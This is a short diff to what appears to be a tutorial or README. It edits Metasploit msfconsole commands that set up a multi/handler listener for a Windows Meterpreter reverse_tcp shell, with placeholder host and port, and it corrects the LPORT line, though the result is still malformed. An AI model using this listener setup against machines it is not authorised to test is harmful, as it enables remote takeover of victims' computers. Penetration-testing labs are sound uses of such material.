@@ -16,7 +16,7 @@ msfconsole
 ```use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST <YOUR HOST IP>
-set LPORT LPORT=<YOUR HOST PORT>
+set LPORT=<YOUR HOST PORT>
 show options
 exploit
 ```
